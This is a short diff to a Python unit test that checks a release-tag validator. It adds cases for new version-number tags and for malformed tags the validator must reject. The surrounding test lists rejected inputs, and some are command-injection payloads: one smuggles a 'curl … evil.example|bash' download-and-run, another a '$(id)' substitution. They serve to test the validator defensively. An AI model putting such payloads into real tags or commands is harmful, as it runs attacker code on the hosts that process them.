@@ -205,6 +205,11 @@ class UpstreamTextTests(unittest.TestCase):
         sha = "a" * 40
         self.assertEqual(candidate.checked("v2026.9.24", sha), ("v2026.9.24", sha))
         self.assertEqual(candidate.checked("2026.10.2", sha), ("2026.10.2", sha))
+        # Upstream's version-number tags since 2026-10 (v0.21.6 on).
+        self.assertEqual(candidate.checked("v0.22.0", sha), ("v0.22.0", sha))
+        for tag in ("v0.22.0-rc1;x", "v0.22", "v0.22.0.1"):
+            with self.assertRaises(SystemExit, msg=tag):
+                candidate.checked(tag, sha)
         for tag in ("v2099.1.1';curl -sL evil.example|bash;'", "v2099.1.1$(id)", "v2026.9.24\nx", "main", ""):
             with self.assertRaises(SystemExit, msg=tag):
                 candidate.checked(tag, sha)
